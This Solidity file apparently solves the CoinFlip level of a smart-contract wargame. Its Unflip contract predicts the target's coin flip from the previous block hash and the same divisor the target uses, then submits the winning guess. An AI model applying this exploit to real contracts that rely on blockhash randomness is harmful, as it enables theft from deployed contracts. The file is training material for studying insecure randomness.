// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title 3. COINFLIP
 * @dev Guess the correct outcome 10 times in a row.
 */

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

// Deploy the Unflip contract and call the attack() function 10 times to win the level.
contract Unflip {
    address constant coinflip = 0xb721D5C58B4B2d7Fc82084541C639A6b6E3CBf73; // Replace with your CoinFlip instance
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function playToWin() private view returns (bool) {
        uint256 pastBlockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipResult = pastBlockValue / FACTOR;
        return coinFlipResult == 1 ? true : false;
    }

    function attack() public {
        ICoinFlip(coinflip).flip(playToWin());
    }
}

// 🎉 Level completed! 🎉
